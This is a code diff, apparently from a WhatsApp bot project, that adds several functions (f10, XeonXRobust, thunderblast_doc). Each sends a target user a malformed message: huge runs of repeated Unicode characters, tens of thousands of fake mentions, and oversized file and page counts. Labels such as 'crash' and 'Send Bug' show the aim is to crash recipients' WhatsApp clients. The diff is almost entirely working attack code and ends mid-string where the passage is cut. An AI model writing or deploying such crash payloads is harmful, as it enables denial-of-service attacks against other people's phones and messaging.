-                                featureEligibilities: {
-                                    cannotBeReactedTo: true,
-                                    cannotBeRanked: true,
-                                    canRequestFeedback: true
-                                },
-                                forwardedNewsletterMessageInfo: {
-                                    newsletterJid: "120363334736301537@newsletter",
-                                    serverMessageId: 1,
-                                    newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
-                                    contentType: 3,
-                                    accessibilityText: "crash"
-                                },
-                                statusAttributionType: 2,
-                                utm: {
-                                    utmSource: "utm",
-                                    utmCampaign: "utm2"
-                                }
+                                hasMediaAttachment: true
                             },
-                            description: "INITIATED_BY_USER"
+                            body: {
+                                text: "" + "ꦾ".repeat(50000) + "@X".repeat(90000) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(90000) + "ᬃᬃ".repeat(90000) + "⿻".repeat(90000)
+                            },
+                            nativeFlowMessage: {},
+                            contextInfo: {
+                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "AngeLs`" }]
+                            }
+                        }
+                    }
+                }
+            }, { participant: { jid: target } });            
+        };
+  async function f10(target, Ptcp = false) {
+    await Xlesy.relayMessage(target, {
+      extendedTextMessage: {
+        text: "`🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉҉n҉ X̷l̷e̷s̷y̷V̷I̷P`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
+        contextInfo: {
+          mentionedJid: ["6283877636168@s.whatsapp.net", ...Array.from({
+            length: 15000
+          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
+          stanzaId: "1234567890ABCDEF",
+          participant: "6283877636168@s.whatsapp.net",
+          quotedMessage: {
+            callLogMesssage: {
+              isVideo: false,
+              callOutcome: "5",
+              durationSecs: "999",
+              callType: "REGULAR",
+              participants: [{
+                jid: "62895329013688@s.whatsapp.net",
+                callOutcome: "5"
+              }]
+            }
+          },
+          remoteJid: target,
+          conversionSource: " X ",
+          conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
+          conversionDelaySeconds: 10,
+          forwardingScore: 10,
+          isForwarded: false,
+          quotedAd: {
+            advertiserName: " X ",
+            mediaType: "IMAGE",
+            jpegThumbnail: fs.readFileSync("./lib/media/image/Gxyenn.png"),
+            caption: " X "
+          },
+          placeholderKey: {
+            remoteJid: "0@s.whatsapp.net",
+            fromMe: false,
+            id: "ABCDEF1234567890"
+          },
+          expiration: 86400,
+          ephemeralSettingTimestamp: "1728090592378",
+          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
+          externalAdReply: {
+            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
+            body: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n҉ 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠",
+            mediaType: "VIDEO",
+            renderLargerThumbnail: true,
+            previewType: "VIDEO",
+            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
+            sourceType: " x ",
+            sourceId: " x ",
+            sourceUrl: "x",
+            mediaUrl: "x",
+            containsAutoReply: true,
+            showAdAttribution: true,
+            ctwaClid: "ctwa_clid_example",
+            ref: "ref_example"
+          },
+          entryPointConversionSource: "entry_point_source_example",
+          entryPointConversionApp: "entry_point_app_example",
+          entryPointConversionDelaySeconds: 5,
+          disappearingMode: {},
+          actionLink: {
+            url: "‎ ‎ "
+          },
+          groupSubject: " X ",
+          parentGroupJid: "6287888888888-1234567890@g.us",
+          trustBannerType: " X ",
+          trustBannerAction: 1,
+          isSampled: false,
+          utm: {
+            utmSource: " X ",
+            utmCampaign: " X "
+          },
+          forwardedNewsletterMessageInfo: {
+            newsletterJid: "6287888888888-1234567890@g.us",
+            serverMessageId: 1,
+            newsletterName: " X ",
+            contentType: "UPDATE",
+            accessibilityText: " X "
+          },
+          businessMessageForwardInfo: {
+            businessOwnerJid: "0@s.whatsapp.net"
+          },
+          smbClientCampaignId: "smb_client_campaign_id_example",
+          smbServerCampaignId: "smb_server_campaign_id_example",
+          dataSharingContext: {
+            showMmDisclosure: true
+          }
+        }
+      }
+    }, Ptcp ? {
+      participant: {
+        jid: target
+      }
+    } : {});
+console.log(chalk.red.bold('🔐 X̷l̷e̷s̷y̷V̷I̷P̷ 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠'))
+};
+
+
+async function XeonXRobust(target, Ptcp = true) {
+  const jids = `_*~@0~*_\n`.repeat(10200);
+  const ui = "ꦽ".repeat(10000);
+  await Xlesy.relayMessage(target, {
+    ephemeralMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            documentMessage: {
+              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+              fileLength: "9999999999999",
+              pageCount: 1316134911,
+              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+              fileName: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n ҉X̷l̷e̷s̷y̷V̷I̷P̷",
+              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+              mediaKeyTimestamp: "1726867151",
+              contactVcard: true,
+              jpegThumbnail: "https://files.catbox.moe/540elt.jpg"
+            },
+            hasMediaAttachment: true
+          },
+          body: {
+            text: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n ҉X̷l̷e̷s̷y̷V̷I̷P̷" + ui + jids
+          },
+          contextInfo: {
+            mentionedJid: ["0@s.whatsapp.net"],
+            mentions: ["0@s.whatsapp.net"]
+          },
+          footer: {
+            text: ""
+          },
+          nativeFlowMessage: {},
+          contextInfo: {
+            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
+              length: 30000
+            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
+            forwardingScore: 1,
+            isForwarded: true,
+            fromMe: false,
+            participant: "0@s.whatsapp.net",
+            remoteJid: "status@broadcast",
+            quotedMessage: {
+              documentMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                fileLength: "9999999999999",
+                pageCount: 1316134911,
+                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                fileName: "🔐 𝐒𝐯 G҉x҉y҉e҉n҉҉n ҉X̷l̷e̷s̷y̷V̷I̷P̷",
+                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                mediaKeyTimestamp: "1724474503",
+                contactVcard: true,
+                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                jpegThumbnail: ""
+              }
+            }
+          }
+        }
+      }
+    }
+  }, Ptcp ? {
+    participant: {
+      jid: target
+    }
+  } : {});
+}
+        async function thunderblast_doc(target) {
+    const messagePayload = {
+        groupMentionedMessage: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        documentMessage: {
+                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
+                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                                fileLength: "999999999999",
+                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
+                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                                fileName: `Undefined`,
+                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
+                                mediaKeyTimestamp: "1715880173"
+                            },
+                        hasMediaAttachment: true
+                    },
+                    body: {
+                            text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴